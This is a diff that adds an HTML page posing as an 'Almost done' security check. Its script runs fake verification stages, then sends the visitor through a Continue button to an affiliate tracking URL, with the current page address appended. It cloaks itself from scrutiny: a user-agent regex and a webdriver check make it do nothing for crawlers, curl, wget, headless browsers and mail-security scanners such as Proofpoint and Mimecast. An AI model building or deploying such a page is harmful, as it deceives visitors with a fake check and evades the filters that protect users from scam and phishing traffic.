@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<title>Almost done</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+  html,body{height:100%}
+  body{
+    font-family:-apple-system,"Segoe UI",Roboto,sans-serif;
+    background:linear-gradient(160deg,#f1f5ff,#ffffff 50%,#e0eaff);
+    color:#0a1e4a;display:flex;align-items:center;justify-content:center;
+    min-height:100dvh;padding:24px;overflow:hidden;
+  }
+  .c{
+    width:100%;max-width:420px;background:#fff;border-radius:22px;
+    padding:32px 26px 24px;border:1px solid #dfe9ff;
+    box-shadow:0 22px 55px rgba(10,30,74,.10);
+  }
+  .pulse-row{
+    display:flex;justify-content:center;gap:10px;margin-bottom:20px;
+  }
+  .pulse-row i{
+    display:block;width:12px;height:12px;border-radius:50%;background:#dbe7ff;
+    transition:background .2s;
+  }
+  .pulse-row i.on{background:#2563eb;animation:pulse .9s ease}
+  @keyframes pulse{
+    0%,100%{box-shadow:0 0 0 0 rgba(37,99,235,.5)}
+    60%{box-shadow:0 0 0 12px rgba(37,99,235,0)}
+  }
+  h1{font-size:21px;font-weight:800;text-align:center;margin-bottom:8px;color:#0a1e4a}
+  .lead{font-size:13.5px;color:#5a6f99;text-align:center;line-height:1.55;margin-bottom:24px}
+  .info{
+    background:#f5f8ff;border:1px solid #e4ecff;border-radius:10px;
+    padding:12px 14px;font-size:12px;color:#5a6f99;line-height:1.5;
+    margin-bottom:20px;
+  }
+  .info b{color:#2563eb;font-weight:700}
+  .cta{
+    width:100%;padding:15px;border:0;border-radius:12px;
+    background:#2563eb;color:#fff;font-family:inherit;font-size:15px;
+    font-weight:700;cursor:pointer;min-height:52px;display:none;
+  }
+  .cta:active{transform:scale(.985)}
+  .cta.on{display:block;animation:fade .3s ease}
+  @keyframes fade{from{opacity:0}to{opacity:1}}
+</style>
+</head>
+<body>
+<div class="c">
+  <div class="pulse-row" id="pr8"><i></i><i></i><i></i><i></i><i></i></div>
+  <h1>Almost done!</h1>
+  <p class="lead">Finishing the security check.<br>One moment please.</p>
+  <div class="info">Status: <b id="ist8">initializing</b></div>
+  <button class="cta" id="ct8" type="button">Continue →</button>
+</div>
+<script>
+(function(){
+  var dest="https://trc.beastbox.pro/click?o=cmvta9nzp000caetjlw6ebg6r&p=AF-1004&sub1=RS";
+  var pName="referrerCF";
+  var dots=document.querySelectorAll("#pr8 i");
+  var ist=document.getElementById("ist8");
+  var ct=document.getElementById("ct8");
+  var agent=(navigator.userAgent||"");
+  var filter=/bot\b|crawler|spider|curl\/|wget\/|python-requests|headlesschrome|phantomjs|googlebot|bingpreview|yandexbot|duckduckbot|facebookexternalhit|telegrambot|googleimageproxy|yahoomailproxy|ms-office|barracuda|proofpoint|mimecast/i;
+  if(filter.test(agent))return;
+  if(navigator.webdriver)return;
+  var human=false;
+  ["pointerdown","touchstart","keydown","scroll"].forEach(function(e){
+    window.addEventListener(e,function(){human=true},{passive:true});
+  });
+  var stageIdx=0;
+  var stageTexts=["checking browser","validating session","confirming human","finalizing","ready"];
+  function step(){
+    if(stageIdx<dots.length){
+      dots[stageIdx].classList.add("on");
+      ist.textContent=stageTexts[stageIdx]||"working";
+      stageIdx++;
+    }
+    if(stageIdx<dots.length){
+      setTimeout(step,450+Math.random()*250);
+      return;
+    }
+    ist.textContent=human?"verified ✓":"awaiting tap";
+    ct.classList.add("on");
+  }
+  setTimeout(step,600+Math.random()*300);
+  var locked=false;
+  ct.addEventListener("click",function(e){
+    e.preventDefault();if(locked)return;locked=true;
+    ct.disabled=true;ct.style.opacity=".6";ist.textContent="redirecting";
+    var full=dest+"&"+pName+"="+encodeURIComponent(location.href);
+    try{document.location=full;}
+    catch(err){
+      try{window.location.assign(full);}
+      catch(_){window.open(full,"_self");}
+    }
+  });
+})();
+</script>
+</body>
+</html>
